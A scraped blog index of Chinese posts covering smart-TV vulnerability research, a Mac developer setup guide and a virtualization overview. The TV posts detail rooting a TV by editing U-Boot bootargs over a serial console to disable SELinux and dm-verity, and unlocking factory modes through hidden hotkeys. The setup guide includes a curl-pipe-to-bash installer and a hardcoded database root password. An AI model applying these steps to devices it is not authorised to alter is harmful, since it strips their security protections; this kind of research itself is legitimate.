/system/bin/factory_app user root group root seclabel u:r:su:s0 当 factory.debug = 1 时，会启动一个后门服务 factory，factory 会调用可知文件 /system/bin/factory_app 。从配置可以看到 factory_app 运行时具有 root 权限，利用这个后门执行任意命令提升权限。但编写利用脚本的漏洞时，没有注意 factory 中的 seclabel 选项，直接被 SELinux 阻断了。 SELinux 阻断漏洞利用 在看漏洞利用程序被 SELinux 阻断之前，先来简单了解一下 SELinux。SELinux 主要作用就是最大限度地减小系统中服务进程可访问的资源（最小权限原则）。SELinux 管理过程中，进程是否可以正确地访问文件资源，取决于它们的安全上下文。 安全上下的结构为: 用户：类型：灵敏度：[类别]。 用户（User）：类似 UID，提供身份识别，用来记录身份。 角色（Role）：标识用户、进程、文件、目录、设备的角色。 类型（Type）：用来将主体(subject)和客体(object)划分为不同的组，给每个主体和系统中的客体定义了一个类型；为进程运行提供最低的权限环境； 级别（Level）：用 s0、s1、s2 来命名的，数值越大级别越高。 首先看SELinux的状态，Enforcing 代表开启了强模式。 $ getenforce Enforcing 再来看当前用户的安全上下文。 $ id -Z context=u:r:shell:s0 查看文件的安全上下文。 $ ls -Z /system/bin/factory_app u:object_r:system_file:s0 /system/bin/factory_app 回到电视的漏洞挖掘总，在这个后门的利用中，由于权限不满足 SELinux 直接阻止了 unix_domain_socket 的连接。好不容易找到的一个提权点就这样报废了。 Tips：一般到 /etc/ 目录去看配置文件，除了看自启文件和各种配置外。需要重点专注的 SELinux 的策略，被伤过的才记忆深刻。Android 电视中的 SELinux 策略配置的挺严格的，阻断了我的好几个利用链路。 寻找串口绕过 SELinux 实现提权 漏洞利用被阻断，心有不甘。于是想到关闭 SELinux 之后，不就可以执行任意命令了，但是要怎么关闭呢。 $ setenforce 0 setenforce: Couldn't set enforcing status to '0': Permission denied setenforce 必定是没有权限的，系统级别无法关闭，那就在更早阶段禁用 SELinux。最后发现可以通过 Bootloader 环境变量 bootargs 来禁用 SELinux。修改 UBoot 中的参数，前提是需要进入Uboot。接入 UBoot 找个串口 ，但电视有没拆怎么知道电视有没有串口呢，直接 cat /dev/ttyS0看不了没权限。 查看 /vendor/etc/set_env 中 bootargs 的值。 $ cat /vendor/etc/set_env |grep bootargs setenv bootargs console=ttyS0,115200 androidboot.console=ttyS0 loglevel=0 root=/dev/ram rw rootwait init=/init CORE_DUMP_PATH=/var/core_dump.%%p.gz KDebug=1 delaylogo=true androidboot.SELinux=permissive 可以看到使用了串口 ttyS0，波特率为 115200。关键是最后，androidboot.SELinux=permissive，指明了 SELinux 开启了。此时需要拆开电视找到串口，修改 bootargs 的值。 拆开电视正好看到了预留的调试接口，使用万用表找到 GND，使用逻辑分析仪找到 Tx。 使用串口工具连接电视串口与电脑。波特率设置为 115200，进入 BootLoader 修改 androidboot.SELinux 的值就能关闭 SELinux。然后使用上面的被 SELinux 拦截的程序就能获得 Root 权限。 setenv bootargs console=ttyS0,115200 androidboot.console=ttyS0 loglevel=0 root=/dev/ram rw rootwait init=/init CORE_DUMP_PATH=/var/core_dump.%%p.gz KDebug=1 delaylogo=true androidboot.SELinux=disabled enforcing=0 androidboot.dm_verity=disabled 设置好环境变量后，使用 saveenv 保存修改的值。最后使用 reset 命令重启电视。 拿到 Root 权限后就能更方便的分析应用了。 console:/ # id uid=0(root) gid=0(root) groups=1003(graphics),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats) TIPS： 电视串口直连电脑时，我们大多使用杜邦线之类的，调试线的长度比较有限。调试的时候不得不离开舒适的电脑椅，甚至要席地而坐，半天下来身心疲惫。此时可以用树莓派连接串口，我们就能回到舒适的电脑椅上继续肝了。 ","date":"2021-11-21","objectID":"/zh-cn/21-2/:1:3","tags":["智能","电视","漏洞挖掘","分析","提权"],"title":"智能电视漏洞挖掘初探之从文件系统分析到提权","uri":"/zh-cn/21-2/"},{"categories":["智能","电视","漏洞挖掘","分析","提权"],"content":"总结 本文是智能电视漏洞挖掘的第三篇，这一篇从初始智能电视文件系统到权限提升，但仍旧是漏洞挖掘的起点，有了 Root 权限才能对应用和服务进行深入的研究，后面会再分享一些对应用和固件等方面的研究。有点其他事情，会断更一段时间，静候。 ","date":"2021-11-21","objectID":"/zh-cn/21-2/:1:4","tags":["智能","电视","漏洞挖掘","分析","提权"],"title":"智能电视漏洞挖掘初探之从文件系统分析到提权","uri":"/zh-cn/21-2/"},{"categories":["智能","电视","漏洞挖掘","分析","提权"],"content":"参考 Android Init Language Vendor Interface Object init.rc 语法与解析 SELinux Security Context SELinux安全上下文的认识 ","date":"2021-11-21","objectID":"/zh-cn/21-2/:1:5","tags":["智能","电视","漏洞挖掘","分析","提权"],"title":"智能电视漏洞挖掘初探之从文件系统分析到提权","uri":"/zh-cn/21-2/"},{"categories":["智能","电视","漏洞挖掘","工程","模式"],"content":"此文为加密收费内容添加我微信支付后可看: ","date":"2021-11-21","objectID":"/zh-cn/21-1/:0:0","tags":["智能","电视","漏洞挖掘","工程","模式"],"title":"智能电视漏洞挖掘初探之寻找工程模式热键","uri":"/zh-cn/21-1/"},{"categories":["智能","电视","漏洞挖掘","工程","模式"],"content":"智能电视漏洞挖掘初探之寻找隐藏功能热键 上周去打汽车安全比赛了，电视漏洞挖掘系列断更了一周，这周咱们继续。在智能电视漏洞挖掘初探之 Getshell 中总结了主流电视进入工程模式的方法,这些都是别人发现的。主要的来源应该是内部的维修文档，售后维修在维修工作中泄露出来的。车机的工程模式想必也一样。如果手头的电视使用已知的方法无法进入，此时当如何？出现这种情况，一是厂商更换了热键（组合键），或是进入方法未知（新系列、新入局者）。如果拿到了固件，那就可以自己动手分析。 隐藏功能不止工程模式，有点电视机文件管理器默认是不显示 APK 应用的，需要通过特殊的组合键开启 APK 显示。在分析应用之前，首先来了解一下遥控器键值。 ","date":"2021-11-21","objectID":"/zh-cn/21-1/:1:0","tags":["智能","电视","漏洞挖掘","工程","模式"],"title":"智能电视漏洞挖掘初探之寻找工程模式热键","uri":"/zh-cn/21-1/"},{"categories":["智能","电视","漏洞挖掘","工程","模式"],"content":"Andriod Keycode 遥控器一般通过红外或蓝牙与电视通信，电视是如何知道我们按下的是什么按键。Android 电视通过按键事件（KeyEvent）监听来自遥控器的按键指令。按键的键值可以通过 getKeyCode() 获取。 键值定义在KeyEvent | Android 开发者 | Android Developers。如返回主页的 HOME 键，键值为 3。 使用 ADB 可以模拟按键事件，以下两条命令都是返回主页的命令。输入之后，电视就会返回到主页。 adb shell input keyevent 3 adb shell input keyevent KEYCODE_HOME 电视上常用的遥控器按键序号如下。 按键 序号 常量名 电源 26 KEYCODE_POWER 菜单 82 KEYCODE_MENU 语音 231 KEYCODE_VOICE_ASSIST 上键 19 KEYCODE_DPAD_UP 下键 20 KEYCODE_DPAD_DOWN 左键 21 KEYCODE_DPAD_LEFT 右键 22 KEYCODE_DPAD_RIGHT 静音 164 KEYCODE_VOLUME_MUTE 音量+ 24 KEYCODE_VOLUME_UP 音量- 25 KEYCODE_VOLUME_DOWN Home 3 KEYCODE_HOME 返回 4 KEYCODE_BACK 确认 66 85 126 127 KEYCODE_ENTER KEYCODE_MEDIA_PLAY_PAUSE KEYCODE_MEDIA_PLAY KEYCODE_MEDIA_PAUSE 数字0~9 144~153 KEYCODE_NUMPAD_0 ~ KEYCODE_NUMPAD_9 上面大多都是一个按键对应一个，唯独确认键对应 4 个。这是因为确认键身兼数值，即是确认键又是播放控制键。 ","date":"2021-11-21","objectID":"/zh-cn/21-1/:1:1","tags":["智能","电视","漏洞挖掘","工程","模式"],"title":"智能电视漏洞挖掘初探之寻找工程模式热键","uri":"/zh-cn/21-1/"},{"categories":["智能","电视","漏洞挖掘","工程","模式"],"content":"寻找隐藏功能热键 下面分享三个案例，第一个是开启 APK 显示，第二个寻找工程模式热键，最后一个是配置文件中的热键定义。 文件管理器显示 APK 文件 某电视在文件管理器中隐藏了 APK 文件，需要通过热键开启显示。现在来分析一下怎么打开。首先找到文件管理应用，然后使用 JADX 打开分析。 搜索关键词 APK 通过检索关键词 APK，看到一个字符串 filebrowser_show_APK。顾名思义是显示 APK 文件，看来就这个电视是可以通过热键开启 APK 显示的。 通过变量名定位到隐藏功能处理函数 通过字符串变量名查询交叉引用，找到 onTrigger 函数。onTrigger判断按键的个数启用不同的功能，如果输入的按键数为 6，设置标志 show_apk 为真，临时显示 APK。如果输入的按键数等于 MULT_KEY 的长度设置全局变量，永久显示 APK。 热键 继续往上分析，MULT_KEY 数组为{82, 82, 19, 19, 20, 20, 21, 22}。 与 Android Keycode 编码对应，转换成按键为 菜单-菜单-上键-上键-下键-下键-左键-右键。 checkKeyValid 中对按键序列进行验证，只有与 MULT_KEY 相匹配才能通过验证。每按下一个按键就验证一个键。如果序列正确返回 true，否则返回 false。 04-30 17:00:52.882 15156 15156 I FileManager-MyMultKeyTrigger: checkKey num= 82 , delayed = 495 check_num=1 mult_key=82 04-30 17:00:52.882 15156 15156 I FileManager-MyMultKeyTrigger: checkKey check key valid = true 04-30 17:04:40.187 15156 15156 I FileManager-MyMultKeyTrigger: checkKey lastEventTime=8419053 04-30 17:04:40.187 15156 15156 I FileManager-MyMultKeyTrigger: checkKey num= 19 , delayed = 227304 check_num=2 mult_key=19 04-30 17:04:40.187 15156 15156 I FileManager-MyMultKeyTrigger: checkKey check key valid = false 触发位置 现在知道了热键，还需要知道在哪里触发。继续往上看，在文件管理器 activity 创建的时候在 VerticalGridView 上监听了一个按键事件（OnKeyInterceptListener），首先验证热键，判断是否开启 APK 显示。 验证 最后总结一下使用方法，遥控器的焦点在本地文件处，然后按顺序点击 菜单-菜单-上键-上键-下键-下键-左键-右键 后，显示提示信息 “apk应用显示已经永久开启”。然后插入U 盘，就能看见里面的文件了。 使用热键进入工程模式 某次发现一个工程模式应用的 AndroidManifest.xml 没有定义 activity，仅作为一个服务被其他应用调用。 不能自己主动打开，但可以使用命令 am startservice 启动服务，打开应用页面就进入了工程模式。 adb shell am startservice -n {package}/{package}.{service} 寻找热键 启动这个应用的前提便是有 ADB 权限，但还是希望能在常规状态打开这个应用。工程模式一般都能使用热键打开，现在开始追溯。通过搜索 service name，在另外一个应用中找到了调用函数。 遗憾的是，这个应用也是一个服务，不能直接打开。那么再往上寻找，搜索关键词 launchFactoryMenu ，发现在 TvSettingsPlus.apk 中定义了热键打开工程模式的方法。 同样，FACTORY_MENU_COMBINATION_KEY 也是一个数组。根据 Andriod Keycode 解码得到 音量+ 音量- 左 左 上 下。 触发位置 找到热键之后，还需要找到触发为位置。根据 TAGcom.android.tv.settings.MainSettings.SETTINGS_FRAGMENT可知是在系统的设置页面中。 验证 首先进入系统设置页面。然后，依此连续快速按遥控器的 音量+ 音量- 左 左 上 下进入工程模式。 热键配置文件 上面的两个案例热键序列都是存在一个数组中，还有另外的方案，如存储在配置文件中。 如上，就可以使用 菜单 左 上 左 上 返回进入工厂菜单（工程模式）了。 ","date":"2021-11-21","objectID":"/zh-cn/21-1/:1:2","tags":["智能","电视","漏洞挖掘","工程","模式"],"title":"智能电视漏洞挖掘初探之寻找工程模式热键","uri":"/zh-cn/21-1/"},{"categories":["智能","电视","漏洞挖掘","工程","模式"],"content":"总结 智能电视中的不少的隐藏功能，需要使用遥控器热键启用。应用监听遥控器发送过来的点击事件启用隐藏功能。分析了一些电视的热键发现基本采用两种方式定义热键，一个是定义在配置文件、另一个是在应用中通过数组定义。找到热键组合后还需要找到触发的页面，只有在特定还能触发成功，因为处理函数只监听在特定界面。 ","date":"2021-11-21","objectID":"/zh-cn/21-1/:1:3","tags":["智能","电视","漏洞挖掘","工程","模式"],"title":"智能电视漏洞挖掘初探之寻找工程模式热键","uri":"/zh-cn/21-1/"},{"categories":["智能","电视","漏洞挖掘","工程","模式"],"content":"参考 KeyEvent ","date":"2021-11-21","objectID":"/zh-cn/21-1/:1:4","tags":["智能","电视","漏洞挖掘","工程","模式"],"title":"智能电视漏洞挖掘初探之寻找工程模式热键","uri":"/zh-cn/21-1/"},{"categories":["Mac","开发","环境","配置"],"content":"此文为加密收费内容添加我微信支付后可看: 环境配置原则 软件 brew clashx neofetch zsh \u0026 oh my zsh vscode rectangle openinterminal-lite google-chrome docker redis redis-cli mysqlworkbench nvm pyenv picGo wireshark Charles 系统设置 由于最近换了新的电脑(MacBookPro 16inch),许多开发环境需要重新配置，记录一下安装的软件。 ","date":"2021-11-21","objectID":"/zh-cn/21/:0:0","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["Mac","开发","环境","配置"],"content":"环境配置原则 软件方便统一管理，安装、升级 优先选择开源的软件 尽量不污染系统环境 ","date":"2021-11-21","objectID":"/zh-cn/21/:1:0","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["Mac","开发","环境","配置"],"content":"软件 ","date":"2021-11-21","objectID":"/zh-cn/21/:2:0","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["Mac","开发","环境","配置"],"content":"brew macOS上的包管理工具，很多软件(包括GUI)都可以通过brew来进行安装，卸载，更新。$ brew install用来安装命令行工具，$ brew cask install用来安装GUI工具。 ","date":"2021-11-21","objectID":"/zh-cn/21/:2:1","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["Mac","开发","环境","配置"],"content":"clashx 一款开源的代理软件 安装:$ brew cask install clashx ","date":"2021-11-21","objectID":"/zh-cn/21/:2:2","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["Mac","开发","环境","配置"],"content":"neofetch 一个用来展示系统参数的命令行工具。安装:$ brew install neofetch ","date":"2021-11-21","objectID":"/zh-cn/21/:2:3","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["Mac","开发","环境","配置"],"content":"zsh \u0026 oh my zsh 由于Catalina上的默认shell已经从bash改为zsh，所以安装了oh my zsh用来管理zsh的插件，查看本机的默认SHELL只需要在terminal中执行$ echo $SHELL或$ cat /etc/shells | tail -n 1 就可以了。/etc/shells文件里面存放了所有支持的shell,最后一个便是默认的shell。 zsh-autosuggestions zsh的智能化提示插件，可以根据历史命令来进行提示。安装:$ brew install zsh-autosuggestions autojump zsh的目录跳转插件，仅仅输入几个字母就可以cd到目标目录，非常方便。安装:$ brew install autojump ","date":"2021-11-21","objectID":"/zh-cn/21/:2:4","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["Mac","开发","环境","配置"],"content":"vscode 开发必备IDE，\u0008通过命令$ code可以快速在vscode中打开当前目录。安装:$ brew cask install visual-studio-code ","date":"2021-11-21","objectID":"/zh-cn/21/:2:5","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["Mac","开发","环境","配置"],"content":"rectangle 一款开源的windows窗口管理软件。可以通过快捷键快速把窗口切分为1/2，4/1，最大化，接近最大化，屏幕中间等。安装:$ brew cask install rectangle ","date":"2021-11-21","objectID":"/zh-cn/21/:2:6","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["Mac","开发","环境","配置"],"content":"openinterminal-lite 一款可以快速在当前目录打开terminal的开源软件。安装:$ brew cask install openinterminal-lite ","date":"2021-11-21","objectID":"/zh-cn/21/:2:7","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["Mac","开发","环境","配置"],"content":"google-chrome 谷歌浏览器，习惯了它的开发者调试工具。安装:$ brew cask install google-chrome ","date":"2021-11-21","objectID":"/zh-cn/21/:2:8","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["Mac","开发","环境","配置"],"content":"docker 一种容器解决方案。可以很方便地对一些服务进行管理。例如：macOS下需要装两个版本的mysql，虽然有实现方案，但是不够优雅。如果使用docker就很简单。只需要创建docker-mysql-version57.yml文件，并且运行$ docker-compose -f docker-mysql-version57.yml -d up即可启动服务。如果需要8.0版本只需要复制一个yml配置文件并修改相关参数即可。安装：brew cask install docker #mysql 5.7 version: \"3.7\" services: db: image: mysql:5.7 container_name: mysql5.7 restart: always ports: - \"3306:3306\" environment: - MYSQL_ROOT_PASSWORD=ysd1991 volumes: - \"/Users/xiaodang/software/mysql/datadir57:/var/lib/mysql\" volumes: db_data: null ","date":"2021-11-21","objectID":"/zh-cn/21/:2:9","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["Mac","开发","环境","配置"],"content":"redis redis同样也选择使用docker安装。创建名为docker-compose.yml的文件，执行$ docker-compose up -d。 version: \"3.7\" services: redis: hostname: redis image: redis container_name: redis restart: always command: redis-server /etc/redis.conf environment: - TZ=Asia/Shanghai volumes: - ./data:/data - ./redis.conf:/etc/redis.conf ports: - \"6379:6379\" ","date":"2021-11-21","objectID":"/zh-cn/21/:2:10","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["Mac","开发","环境","配置"],"content":"redis-cli 通过docker安装的redis服务，所以本地环境中没有redis-cli工具，通过homebrew-redis-cli安装 ","date":"2021-11-21","objectID":"/zh-cn/21/:2:11","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["Mac","开发","环境","配置"],"content":"mysqlworkbench 一款管理mysql的GUI工具，安装：$ brew cask install mysqlworkbench ","date":"2021-11-21","objectID":"/zh-cn/21/:2:12","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["Mac","开发","环境","配置"],"content":"nvm Node的版本管理工具，由于官方不建议通过brew安装。只能手动:$ curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.36.0/install.sh | bash ","date":"2021-11-21","objectID":"/zh-cn/21/:2:13","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["Mac","开发","环境","配置"],"content":"pyenv python的版本管理工具。由于macOS系统自带的python版本为2.7，并且没有pip，所以较好的实践方法是。用python来安装2.7版本和3.X版本，这样不会因为修改系统的python而出现奇怪的问题。 安装:$ brew install pyenv ","date":"2021-11-21","objectID":"/zh-cn/21/:2:14","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["Mac","开发","环境","配置"],"content":"picGo 一款图床工具，可以用GitHub等平台作为图床，\u0008用于上传和管理blog里的图片，因为hexo的图片管理真的太难用了。安装：$ brew cask install picGo。注意:picGo默认开启了快捷方式shift+command+p，和vscode的Command Palette快捷键冲突，可以选择关闭。 ","date":"2021-11-21","objectID":"/zh-cn/21/:2:15","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["Mac","开发","环境","配置"],"content":"wireshark 网络协议分析工具，能够分析所有类型的流量。通关观察数据包，对于理解网络协议也很有帮助。安装:brew cask install wireshark ","date":"2021-11-21","objectID":"/zh-cn/21/:2:16","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["Mac","开发","环境","配置"],"content":"Charles HTTP/HTTPS监控、代理软件，主要用来分析HTTP流量，也可以对请求进行修改、重放等。 安装brew cask install Charles ","date":"2021-11-21","objectID":"/zh-cn/21/:2:17","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["Mac","开发","环境","配置"],"content":"系统设置 设置-触控板-开启 轻点来点按 设置-辅助功能-指针控制-触控板选项-启用三只拖拽 设置-触控板-光标与点按-查询与数据检查器 三指点按 设置-程序坞-置于屏幕左边 并 自动显示和隐藏程序坞 注：以上的软件安装步骤仅做本人记录，完整安装需要查看官方文档，以及安装过程中的LOG输出。 ","date":"2021-11-21","objectID":"/zh-cn/21/:3:0","tags":["Mac","开发","环境","配置"],"title":"MACBOOKPRO开发环境配置","uri":"/zh-cn/21/"},{"categories":["虚拟化"],"content":"此文为加密收费内容添加我微信支付后可看: 了解虚拟化 在计算机技术中，虚拟化（技术）或虚拟技术（英语：Virtualization）是一种资源管理技术，是将计算机的各种实体资源（CPU、内存、磁盘空间、网络适配器等），予以抽象、转换后呈现出来并可供分割、组合为一个或多个电脑配置环境。由此，打破实体结构间的不可切割的障碍，使用户可以比原本的配置更好的方式来应用这些电脑硬件资源。这些资源的新虚拟部分是不受现有资源的架设方式，地域或物理配置所限制。一般所指的虚拟化资源包括计算能力和资料存储。 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:0:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"目录 1定义 2历史 3虚拟化技术的类别 3.1按虚拟的对象分类 3.2按照抽象程度分类 3.2.1指令集架构等级的虚拟化（Instruction Set Architecture Level） 3.2.2硬件抽象层等级的虚拟化（Hardware Abstraction Level） 3.2.3操作系统等级的虚拟化（Operating System Level） 3.2.4编程语言等级的虚拟化（Programming Language Level） 3.2.5函式库等级的虚拟化（Library Level） 4虚拟化技术的应用 5参考文献 6相关条目 7外部链接 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:1:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"定义[编辑] 由于目前信息技术领域的很多企业都曾在宣传中将该企业的某种技术称为虚拟化技术，这些技术涵盖的范围可以从Java虚拟机技术到系统管理软件，这就使得准确的界定虚拟技术变得困难。因此各种相关学术论文在谈到虚拟技术时常常提到的便是如前面所提到的那个不严格的定义。 虚拟技术：计算机资源的重新分配 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:2:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"历史[编辑] 虚拟化技术起源于20世纪60年代末，美国IBM公司当时开发了一套被称作虚拟机监视器（Virtual Machine Monitor）的软件，该软件作为计算机硬件层上面的一层软件抽象层，将计算机硬件虚拟分割成一个或多个虚拟机，并提供多用户对大型计算机的同时、交互访问。 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:3:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"虚拟化技术的类别[编辑] ","date":"2021-11-20","objectID":"/zh-cn/20-3/:4:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"按虚拟的对象分类[编辑] 硬件虚拟化 虚拟机 （Virtual machine或VM），可以像真实机器一样运行程序的计算机的软件实现 平台虚拟化 ，将操作系统和硬件平台资源分割开 完全虚拟化，敏感指令在操作系统和硬件之间被捕捉处理，客户操作系统无需修改，所有软件都能在虚拟机中运行，例如IBM CP/CMS，VirtualBox，VMware，QEMU 硬件辅助虚拟化，利用硬件（主要是CPU）辅助处理敏感指令以实现完全虚拟化的功能，客户操作系统无需修改，例如VMware，Xen，KVM，Hyper-V 部分虚拟化，针对部分应用程序进行虚拟，而不是整个操作系统 准虚拟化/超虚拟化（paravirtualization），为操作系统提供与底层硬件相似但不相同的软件接口，客户操作系统需要进行修改。例如Xen的半虚拟化模式，Hyper-V，KVM的VirtIO。 操作系统级虚拟化，使操作系统内核支持多用户空间实体，例如Parallels Virtuozzo Containers、OpenVZ、LXC以及类Unix系统上的chroot，Solaris上的Zone，FreeBSD上的FreeBSD jail。 应用程序虚拟化 ，在操作系统和应用程序间创建虚拟环境 便携式应用程序，允许程序在便携式设备中运行而不用在操作系统中安装 跨平台虚拟化，允许针对特定CPU或者操作系统的软件不做修改就能运行在其他平台上，例如Wine 虚拟设备，运行于虚拟化平台之上，面向应用的虚拟机映像 模拟器 虚拟内存，将不相邻的内存区，甚至硬盘空间虚拟成统一连续的内存地址 存储虚拟化，将实体存储空间（如硬盘）分隔成不同的逻辑存储空间 网络虚拟化 ，将不同网络的硬件和软件资源结合成一个虚拟的整体 虚拟专用网络（VPN），在大型网络（通常是Internet）中的不同计算机（节点）通过加密连接而组成的虚拟网络，具有类似局域网的功能 存储器虚拟化，将网络系统中的随机存储器聚合起来，形成统一的虚拟内存池 桌面虚拟化，在本地计算机显示和操作远程计算机桌面，在远程计算机执行程序和储存信息 数据库虚拟化 软件虚拟化 服务虚拟化 数据虚拟化 (data virtualization), 数据虚拟化是一种统一来自多个来源的数据的方法，这样应用程序，报告工具和最终用户就可以访问数据，而不需要有关原始来源，位置和数据结构的详细信息。[1] ","date":"2021-11-20","objectID":"/zh-cn/20-3/:4:1","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"按照抽象程度分类[编辑] 虚拟技术按抽象程度来分为五个层次 按照抽象程度的不同，常常把虚拟技术分为五个层次： 指令集架构等级的虚拟化（Instruction Set Architecture Level）[编辑] 指令集架构的虚拟化是透过软件来模拟不同架构的处理器、存储器、总线、磁盘控制卡、计时器等多个I/O设备，软件会将虚拟机所发出的指令转换为本机可以操作的指令在现有的硬件上执行。这种等级的虚拟化对于模拟相同处理器架构的平台可以提供很好的兼容性，例如︰x86架构、Sparc架构、Alpha架构。 若主机处理器可以执行由虚拟机转换出来的指令，或是使用相同的指令集来完成任务，那就表示除了处理器以外的操作系统、I/O设备皆可不受特定平台所绑定，但由于虚拟机的每条指令都必须透过软件来模拟，所以在性能会有较大程度的耗损。 这个分类底下代表性的有Bochs以及QEMU。 硬件抽象层等级的虚拟化（Hardware Abstraction Level）[编辑] 硬件抽象层等级的虚拟化是由虚拟机监控器来隐藏不同厂商的处理器、存储器、芯片组…等特征，为这些虚拟机提供抽象与统一的虚拟平台。运行此平台的电脑称之为主体机器（Host Machine），而在此平台中运作的虚拟机称为客体机器（Guest Machine）， 目前大多数x86平台的商业电脑都在使用这种虚拟化，最主要是由于现今处理器厂商提供了硬件辅助虚拟化技术，例如︰第三世代的Intel VT-d、AMD-Vi皆提供虚拟机直接存储器访问（Direct Memory Access）以及对各种PCI接口的直接访问功能（PCI passthrough）。 这个分类底下代表性的有VMware ESXi、Hyper-V、以及Citrix。 操作系统等级的虚拟化（Operating System Level）[编辑] 硬件抽象层等级的虚拟化中的全虚拟化与操作系统底层间有非常高的隔离能力，支持不同的操作系统，安装后不须要重启主机、或修改引导程序（Boot Loader）以达到双系统的目的，风险低、维护简单。由于此等级的虚拟机可以访问底层操作系统，因此用户必须花费大量的时间来安装与设置虚拟机，接着才能开始评估或测试所需运作的软件，这些设置包含了操作系统的安装、安全性或兼容性软件的更新、网络、系统调校…等，如果所需的操作系统与底层操作系统相同，那么其实它们所作的跟实际上安装一台实体机器没有什么区别。 操作系统内核虚拟化可以最大限度的减少新增虚拟机的所需，在这个等级的虚拟机共享实体主机上的硬件以及操作系统，呈现彼此独立且隔离的虚拟机环境。 应用软件的环境是由操作系统、库、相依性软件、特定于系统的数据结构或文件系统，例如︰NTFS或Ext4，以及其他环境设置所组成。如果这些都保持不变，应用软件很难发现与真实环境的区别。这是所有操作系统等级虚拟化的关键想法。 这个分类底下代表性的有Docker、LXC和OpenVZ。 编程语言等级的虚拟化（Programming Language Level）[编辑] 传统电脑是由指令集架构所驱动的一种机械语言，硬件的操作由特殊的I/O指令处理，也可以透过区块映射（Mapping）来操作存储器，此等级的虚拟化会将高级语言转译成一种名为字节码的语言，透过虚拟机转译成为可以直接执行的命令。跨操作系统平台、跨语言皆为其优点。 这个分类底下代表性的有Oracle Java、Microsoft . NET、Parrot。 库等级的虚拟化（Library Level）[编辑] 大部分的应用程序都是使用由许多库组成的API（Application Programming Interface）来设计，使用动态链接的方式用于隐藏操作系统的细节，目的是提供程序员更简单的工作。这也产生了一种新的虚拟化方式，使用不同的API与不同操作系统底层的ABI（Application Binary Interface）来进行模拟的工作。 这个分类底下代表性的有Wine以及WSL（Windows Subsystem for Linux）。 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:4:2","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"虚拟化技术的应用[编辑] 服务器集成 沙盒（Sandboxing） 多运行环境 多操作系统 测试和性能监视 应用集成 虚拟硬件 软件移植 系统可管理性 测试/质量保证 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:5:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"参考文献[编辑] Susanta Nanda, Tzi-cker Chiueh, “A Survey on Virtualization Technologies\"; R.P.Goldberg, “Survey of Virtual Machine Research”, Computer, June 1974, pp.34-45; G.J.Popek, R.P.Goldberg, “Formal Requirements for Virtualizable Third Generation Architectures,” Comm.ACM, Vol.17, Nr.7, July 1974, pp.412-421; Joba Yeh (2018). “Research on Big Data Analysis Platform and Services”, NDLTD in Taiwan, August 2018, pp.16-22. ","date":"2021-11-20","objectID":"/zh-cn/20-3/:6:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"相关条目[编辑] 虚拟化发展时间线 硬件虚拟化 x86虚拟化 虚拟机 虚拟机监视器 VMware Hyper-V KVM VirtualBox Virtual PC 软件虚拟化 服务虚拟化 虚拟设备 Docker 